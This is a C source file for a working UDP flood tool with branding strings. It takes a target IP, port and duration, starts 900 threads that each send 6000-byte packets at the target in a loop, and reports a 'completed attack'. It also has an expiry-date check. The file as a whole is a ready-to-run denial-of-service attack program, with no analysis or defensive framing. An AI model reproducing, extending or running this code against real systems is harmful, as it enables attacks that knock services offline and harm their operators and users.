#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 900
#define PAYLOAD_SIZE 6000  // IPxKINGYT©2024

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    memset(payload, 'A', PAYLOAD_SIZE - 1);
    payload[PAYLOAD_SIZE - 1] = '\0';

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0,
                   (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    // Expiration check: February 28, 2026, at 23:59:59
    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2026 - 1900; // tm_year is years since 1900
    expiration_tm.tm_mon  = 1;           // February (months are 0-based: 0 = January, 1 = February)
    expiration_tm.tm_mday = 28;
    expiration_tm.tm_hour = 23;
    expiration_tm.tm_min  = 59;
    expiration_tm.tm_sec  = 59;
    time_t expiration_time = mktime(&expiration_tm);
    
    if (time(NULL) > expiration_time) {
        printf("This tool has expired.\n");
        return 1;
    }

    AttackParams params;
    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    params.ip[sizeof(params.ip) - 1] = '\0';  // Ensure null termination
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];

    printf("MADE BY VENOM PAPA %s:%d for %d seconds with %d threads...\n",
           params.ip, params.port, params.duration, MAX_THREADS);

    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Completed attack on %s:%d for %d seconds\n",
           params.ip, params.port, params.duration);

    return 0;
}
